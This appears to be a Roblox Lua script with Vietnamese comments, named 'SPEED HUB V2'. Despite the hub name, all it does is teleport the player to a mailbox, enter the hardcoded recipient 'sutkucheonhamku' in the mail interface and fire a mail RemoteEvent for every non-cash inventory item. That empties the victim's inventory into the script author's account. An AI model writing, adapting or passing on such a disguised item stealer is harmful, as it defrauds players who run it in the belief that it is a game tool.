-- =======================================================================
-- SPEED HUB V2: FULL TỰ ĐỘNG (TELE -> MỞ MAIL -> PASTE TÊN -> NHẤP -> GỬI)
-- =======================================================================
if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick nhận đồ

-- Hàm click chuột vật lý vào UI
local function virtualClick(element)
    if element and element:IsA("GuiButton") then
        element.MouseButton1Click:Fire()
        return true
    end
    return false
end

-- Quy trình xử lý chính
task.spawn(function()
    -- 1. Tìm và Tele đến Mailbox
    local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local mailbox = nil
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if (string.find(string.lower(obj.Name), "mail")) and obj:IsA("BasePart") then
            mailbox = obj
            break
        end
    end

    if mailbox then
        rootPart.CFrame = mailbox.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.5)
        
        -- Mở Mailbox bằng cách tương tác
        local prompt = mailbox:FindFirstChildWhichIsA("ProximityPrompt", true)
        if prompt then
            prompt:InputHoldBegin()
            task.wait(prompt.HoldDuration + 0.1)
            prompt:InputHoldEnd()
            task.wait(1)
        end
    end

    -- 2. Tìm bảng Mail và thực hiện Paste + Click
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if (gui:IsA("Frame") or gui:IsA("ImageLabel")) and string.find(string.lower(gui.Name), "mail") and gui.Visible then
            mailFrame = gui
            break
        end
    end

    if mailFrame then
        -- Paste tên vào ô Search
        local searchBox = nil
        for _, obj in pairs(mailFrame:GetDescendants()) do
            if obj:IsA("TextBox") then searchBox = obj break end
        end
        
        if searchBox then
            searchBox.Text = targetUsername
            searchBox:ReleaseFocus(true)
            task.wait(1.5) -- Đợi game lọc
        end

        -- Nhấp vào ô chứa tên người nhận
        for _, obj in pairs(mailFrame:GetDescendants()) do
            if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), string.lower(targetUsername)) then
                local btn = obj:FindFirstAncestorWhichIsA("GuiButton")
                if btn then
                    virtualClick(btn)
                    task.wait(0.5)
                    break
                end
            end
        end

        -- 3. Gửi đồ qua RemoteEvent
        local MailEvent = nil
        for _, obj in pairs(game:GetDescendants()) do
            if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
                MailEvent = obj
                break
            end
        end
        
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        
        if MailEvent and Inventory then
            for _, item in pairs(Inventory:GetDescendants()) do
                if item:IsA("ValueBase") and item.Value > 0 and not string.find(string.lower(item.Name), "cash") then
                    pcall(function() MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) end)
                    task.wait(0.1)
                end
            end
            print("[SPEED HUB] ==== HOÀN TẤT GỬI ĐỒ! ====")
        end
    end
end)
